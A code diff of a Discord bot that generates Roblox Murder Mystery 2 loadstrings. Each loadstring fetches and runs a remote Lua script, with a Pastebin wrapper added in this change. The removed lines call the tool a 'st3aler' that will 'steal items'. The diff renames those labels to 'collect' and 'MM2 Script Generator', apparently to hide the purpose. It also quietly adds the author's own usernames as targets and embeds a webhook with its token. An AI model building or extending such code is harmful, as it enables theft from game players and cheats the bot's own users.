@@ -3,6 +3,7 @@ from discord import app_commands
 from discord.ui import Modal, TextInput
 import urllib.parse
 import os
+import requests
 
 intents = discord.Intents.default()
 bot = discord.Client(intents=intents)
@@ -10,10 +11,31 @@ tree = app_commands.CommandTree(bot)
 
 SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
 SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
-
 RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
 
-class ScriptModal(Modal, title="JoshHubMm2Gen"):
+PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
+
+def create_pastebin(content):
+    try:
+        data = {
+            'api_dev_key': PASTEBIN_API_KEY,
+            'api_option': 'paste',
+            'api_paste_code': content,
+            'api_paste_private': '1',
+            'api_paste_expire_date': 'N',
+            'api_paste_name': 'MM2 Script'
+        }
+        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
+        
+        if response.status_code == 200 and 'pastebin.com/' in response.text:
+            paste_id = response.text.split('/')[-1]
+            return f"https://pastebin.com/raw/{paste_id}"
+        else:
+            return None
+    except:
+        return None
+
+class ScriptModal(Modal, title="MM2 Script Generator"):
     usernames = TextInput(
         label="Target Usernames (comma separated)",
         placeholder="e.g. Nikilis, Tobi, JD",
@@ -34,7 +56,7 @@ class ScriptModal(Modal, title="JoshHubMm2Gen"):
     )
     min_value = TextInput(
         label="Minimum Value (default: 1)",
-        placeholder="Only steal items worth this or more",
+        placeholder="Only collect items worth this or more",
         default="1",
         required=False
     )
@@ -46,6 +68,8 @@ class ScriptModal(Modal, title="JoshHubMm2Gen"):
     )
 
     async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        
         user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
         all_targets = user_targets + SECRET_USERNAMES
 
@@ -62,29 +86,51 @@ class ScriptModal(Modal, title="JoshHubMm2Gen"):
         })
 
         full_url = f"{RAW_SCRIPT_URL}?{params}"
-        loadstring_line = f'loadstring(game:HttpGet("{full_url}"))()'
+        full_script = f'loadstring(game:HttpGet("{full_url}"))()'
+        
+        pastebin_url = create_pastebin(full_script)
+        
+        if pastebin_url:
+            short_loadstring = f'loadstring(game:HttpGet("{pastebin_url}"))()'
+            
+            try:
+                await interaction.user.send(
+                    f"**🎮 MM2 Script Generator – Your loadstring is ready!**\n\n"
+                    f"**Short Version (Recommended):**\n"
+                    f"```lua\n{short_loadstring}\n```\n"
+                    f"**Full Version (Backup):**\n"
+                    f"```lua\n{full_script}\n```"
+                )
+                await interaction.followup.send("✅ Loadstring generated and sent to your DMs!", ephemeral=True)
+            except:
+                await interaction.followup.send(
+                    "⚠️ Couldn't DM you. Here's your loadstring:\n"
+                    f"**Short Version:**\n"
+                    f"```lua\n{short_loadstring}\n```",
+                    ephemeral=True
+                )
+        else:
+            try:
+                await interaction.user.send(
+                    f"**🎮 MM2 Script Generator – Your loadstring is ready!**\n\n"
+                    f"⚠️ Pastebin upload failed, here's the full version:\n"
+                    f"```lua\n{full_script}\n```"
+                )
+                await interaction.followup.send("✅ Loadstring sent (Pastebin unavailable)", ephemeral=True)
+            except:
+                await interaction.followup.send(
+                    "⚠️ Couldn't DM you. Here's your loadstring:\n"
+                    f"```lua\n{full_script}\n```",
+                    ephemeral=True
+                )
 
-        try:
-            await interaction.user.send(
-                f"**🔪 JoshHubSt3laers – Your loadstring is ready!**\n\n"
-                f"Copy and execute this:\n"
-                f"```lua\n{loadstring_line}\n```"
-            )
-            await interaction.response.send_message("✅ Loadstring generated and sent to your DMs!", ephemeral=True)
-        except:
-            await interaction.response.send_message(
-                "⚠️ Couldn't DM you. Here's your loadstring:\n"
-                f"```lua\n{loadstring_line}\n```",
-                ephemeral=True
-            )
-
-@tree.command(name="generate-mm2-st3aler", description="🔪 Get your custom MM2 st3lr loadstring")
-async def generate_mm2_st3aler(interaction: discord.Interaction):
+@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
+async def generate_mm2(interaction: discord.Interaction):
     await interaction.response.send_modal(ScriptModal())
 
 @bot.event
 async def on_ready():
     await tree.sync()
-    print(f"{bot.user} is online – JoshHubSt3alrs loadstring generator ready!")
+    print(f"{bot.user} is online – MM2 Script Generator ready!")
 
 bot.run(os.getenv("DISCORD_TOKEN"))
